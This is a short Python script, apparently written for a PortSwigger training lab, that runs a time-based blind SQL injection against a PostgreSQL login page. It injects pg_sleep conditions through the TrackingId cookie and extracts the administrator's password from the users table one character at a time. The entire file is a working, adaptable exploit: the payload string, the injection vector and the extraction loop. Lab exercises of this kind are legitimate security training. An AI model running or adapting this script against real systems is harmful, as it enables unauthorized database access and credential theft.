#! /bin/python3

# Made for PortSwigger SQLi Lab (BSQLi on PostGreSQL w/ Conditional Errors)

import requests
from requests.structures import CaseInsensitiveDict

# Configurations

url = "https://0a95008f033fcac0c0ff2ffc00f000ba.web-security-academy.net/login"

char_space = 'abcdefghijklmnopqrstuvwxyz01234567890'

expected_data_length = 25

expected_time_delay = 6

table_name = "users"
column_name = "password"
filter_column_name = "username"
filter_column_data = "administrator"

extracted_data = ""

print("\n[!] Attack in Progress...\n")

# Data Extrapolation

for position in range(1, expected_data_length):

	for char in char_space:

		injection_string = f"'|| (SELECT CASE WHEN ({filter_column_name}='{filter_column_data}' AND SUBSTRING({column_name},{position},1) = '{char}') THEN pg_sleep({expected_time_delay}) ELSE pg_sleep(0) END from users)--"

		# Injection Vector
		
		headers = CaseInsensitiveDict()
		headers["Cookie"] = f"TrackingId=2nUmIJib0qgPCphv{injection_string}; session=pTF9tzVwdMKHoGH8zphLiXWZMKymHGeY"

		resp = requests.get(url, headers=headers)

		if resp.elapsed.total_seconds() > (expected_time_delay - 1):
		
			extracted_data = extracted_data + char
			print("[+] Character #" + str(position) + " found!")
			break
		
		else:
			pass

print("\n[!] Data Extracted: " + extracted_data)
